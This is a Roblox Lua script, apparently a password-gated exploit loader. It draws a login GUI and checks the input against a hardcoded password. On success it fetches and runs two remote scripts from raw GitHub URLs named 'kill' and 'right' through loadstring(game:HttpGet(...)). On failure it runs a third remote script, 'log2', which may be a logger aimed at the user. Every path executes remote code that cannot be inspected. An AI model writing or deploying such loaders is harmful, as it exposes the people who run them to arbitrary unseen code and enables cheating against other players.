
local zzz = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")

--Properties:

zzz.Name = "zzz"
zzz.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
zzz.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = zzz
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(255, 0, 4)
Frame.BorderSizePixel = 8
Frame.Position = UDim2.new(0.482664227, 0, 0.502267599, 0)
Frame.Size = UDim2.new(0, 360, 0, 143)

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderColor3 = Color3.fromRGB(255, 0, 4)
TextBox.BorderSizePixel = 3
TextBox.Position = UDim2.new(0.219545811, 0, 0.14807418, 0)
TextBox.Size = UDim2.new(0, 200, 0, 50)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "PASSWORD"
TextBox.TextColor3 = Color3.fromRGB(255, 0, 4)
TextBox.TextSize = 40.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(255, 0, 4)
TextButton.BorderSizePixel = 2
TextButton.Position = UDim2.new(0.223235995, 0, 0.651745081, 0)
TextButton.Size = UDim2.new(0, 197, 0, 32)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "LOGIN"
TextButton.TextColor3 = Color3.fromRGB(255, 5, 9)
TextButton.TextSize = 50.000
TextButton.MouseButton1Click:Connect(function()
    if TextBox.Text == "perkys OWO" then
        zzz:Destroy()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/kill'))()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/right'))()
        else
        loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/log2'))()
end
end)
